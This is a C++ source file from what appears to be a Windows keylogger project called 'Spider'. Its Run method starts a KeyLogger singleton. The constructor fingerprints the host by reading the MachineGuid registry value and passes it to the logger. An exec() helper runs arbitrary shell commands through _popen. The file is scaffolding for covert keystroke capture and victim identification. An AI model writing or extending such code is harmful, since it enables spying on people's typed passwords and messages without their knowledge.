#include "Spider.h"

int					Spider::Run()
{
	try {
		KeyLogger& ptr1 = KeyLogger::Instance();
		ptr1.Run();
	}
	catch (const boost::exception& e) {
		(void)e;
		return (-1);
	}
	return (0);
}

std::string			exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}

std::string GetSZValueUnique(HKEY openKey, const char* regkey, const char* keyName)
{
	HKEY hKey = 0;
	BYTE data[512];
	DWORD szsize = 512;
	std::string value;
	LONG retV;

	LONG retValue = RegOpenKeyEx(openKey, regkey, 0, KEY_READ, &hKey);

	if (retValue == ERROR_SUCCESS)
	{
		retV = RegQueryValueEx(hKey, keyName, 0, 0, data, &szsize);
		if (retV == ERROR_SUCCESS)
		{
			char* _value = reinterpret_cast<char*>(data);
			value = _value;

			RegCloseKey(hKey);
			return value;
		}
		else
		{
			char msg[512];
			FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, 0, (DWORD)retV, 0, &msg[0], 512, 0);
			std::string error_string = &msg[0];
			MessageBox(0, error_string.c_str(), "Query : GetSZValueUnique", 0);
		}
	}
	RegCloseKey(hKey);
	return "";
}

Spider::Spider()
{
	KeyLogger& ptr1 = KeyLogger::Instance();

	ptr1.Initialization(GetSZValueUnique(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid"));
}


Spider::~Spider()
{
}
